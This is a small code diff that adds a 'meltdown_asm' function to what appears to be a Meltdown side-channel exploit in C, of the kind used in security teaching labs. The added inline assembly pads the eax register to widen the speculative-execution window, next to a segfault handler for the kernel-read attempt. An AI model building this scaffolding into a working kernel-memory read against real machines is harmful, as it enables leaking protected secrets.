@@ -12,6 +12,19 @@ void meltdown(unsigned long kernel_data_addr)
 static sigjmp_buf jbuf;
 static void catch_segv() { siglongjmp(jbuf, 1); }
 
+void meltdown_asm(unsigned long kernel_data_addr)
+{
+    char kernel_data = 0;
+    // Give eax register something to do
+    asm volatile(
+        ".rept 400;"
+        "add $0x141, %%eax;"
+        ".endr;"
+        :
+        :
+        : "eax");
+}
+
 int main()
 {
     // Register a signal handler
